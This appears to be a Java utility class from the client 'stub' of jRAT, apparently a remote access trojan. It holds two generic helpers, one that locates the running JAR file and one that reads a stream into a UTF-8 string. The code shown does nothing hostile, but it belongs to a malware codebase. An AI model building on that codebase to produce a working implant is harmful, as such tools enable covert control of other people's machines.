package io.jrat.stub.utils;

import io.jrat.stub.Main;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;

import com.redpois0n.oslib.OperatingSystem;

public class Utils {

	public static File getJarFile() {
		return new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath().replace("%20", " ").replace("file:", ""));
	}

	public static String readString(InputStream is) throws IOException {
		char[] buf = new char[2048];
		Reader r = new InputStreamReader(is, "UTF-8");
		StringBuilder s = new StringBuilder();
		while (true) {
			int n = r.read(buf);
			if (n < 0)
				break;
			s.append(buf, 0, n);
		}
		return s.toString();
	}
}
